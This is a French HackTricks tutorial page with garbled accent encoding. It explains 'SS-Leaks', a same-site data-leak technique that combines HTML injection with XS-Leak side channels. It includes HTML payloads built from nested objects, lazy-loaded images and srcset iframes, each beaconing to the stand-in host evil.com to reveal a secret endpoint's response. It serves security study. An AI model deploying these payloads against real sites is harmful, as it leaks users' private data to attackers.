# Fuites de SS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Il s'agit d'un **mÃ©lange** entre **markup suspendu et XS-Leaks**. D'un cÃ´tÃ©, la vulnÃ©rabilitÃ© permet d'**injecter du HTML** (mais pas du JS) dans une page de la **mÃªme origine** que celle que nous attaquerons. D'un autre cÃ´tÃ©, nous n'**attaquerons** pas directement la page dans laquelle nous pouvons injecter du HTML, mais **une autre page**.

## Objets imbriquÃ©s

Si le point de terminaison <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> renvoie un code d'Ã©tat 404, alors l'objet interne est chargÃ©, donnant un rappel Ã  <mark style="color:yellow;">`https://evil.com?callback=a`</mark> et nous indiquant que la requÃªte de recherche `a` n'a donnÃ© aucun rÃ©sultat.
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### Chargement paresseux

Et si CSP bloque les objets externes ? Essayons Ã  nouveau avec le CSP suivant :

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

Notre rappel `object` prÃ©cÃ©dent ne fonctionne plus. Ã€ la place, nous pouvons utiliser le [chargement paresseux](https://developer.mozilla.org/fr/docs/Web/Performance/Lazy_loading) d'images ! L'image suivante ne se chargera que lorsqu'elle sera visible et Ã  une certaine distance de la fenÃªtre d'affichage.
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### Images RÃ©actives

La technique ci-dessus est excellente, mais elle repose sur notre injection HTML se trouvant dans le champ de vision de l'utilisateur.

Si l'injection est hors de l'Ã©cran et que l'utilisateur ne fait pas dÃ©filer, pouvons-nous toujours divulguer des donnÃ©es ? Bien sÃ»r, nous pouvons utiliser des identifiants d'Ã©lÃ©ments et [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) pour crÃ©er une URL qui force un dÃ©filement, mais cela dÃ©pend de l'interaction de l'utilisateur et ne nous permet pas d'obtenir des fuites cohÃ©rentes dans un scÃ©nario rÃ©el. IdÃ©alement, nous voulons armer l'injection HTML stockÃ©e de maniÃ¨re fiable.

Entrez les images rÃ©actives ! Plus prÃ©cisÃ©ment, les attributs `srcset` et `sizes` des images.

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

Il y a plusieurs choses Ã  comprendre ici. Tout d'abord, rappelez-vous que l'iframe interne ne sera visible que si le point de terminaison fuyant renvoie un code d'Ã©tat 404.

C'est important car nous allons maintenant charger conditionnellement l'image dans l'iframe Ã  partir de deux URL diffÃ©rentes. En utilisant l'attribut `sizes`, nous pouvons utiliser des [requÃªtes mÃ©dia](https://developer.mozilla.org/fr/docs/Web/CSS/Requ%C3%AAtes_m%C3%A9dia_CSS/Utiliser_des_requ%C3%AAtes_m%C3%A9dia) pour choisir Ã  partir de quelle URL charger l'image, en fonction de la taille de l'affichage. 

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

Ã‰tant donnÃ© que notre iframe a une largeur de `width="1000px"`, les Ã©vÃ©nements suivants se produisent :

1. Si le point de terminaison de fuite renvoie un code d'Ã©tat 404, l'iframe est affichÃ©e et a une largeur de 1000px. L'image Ã  l'intÃ©rieur de l'iframe correspond Ã  la requÃªte mÃ©dia `(min-width: 1000px)` et charge l'image de 800px Ã  partir de `https://evil.com?callback=0`.
2. Si le point de terminaison de fuite renvoie un code d'Ã©tat 200, l'iframe n'est _pas_ affichÃ©e. Ã‰tant donnÃ© que l'image n'est pas rendue dans le cadre d'une grande iframe, elle correspond Ã  la requÃªte mÃ©dia `(max-width 999px)` et charge l'image de 480px Ã  partir de `https://evil.com?callback=1`.

## RÃ©fÃ©rences

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
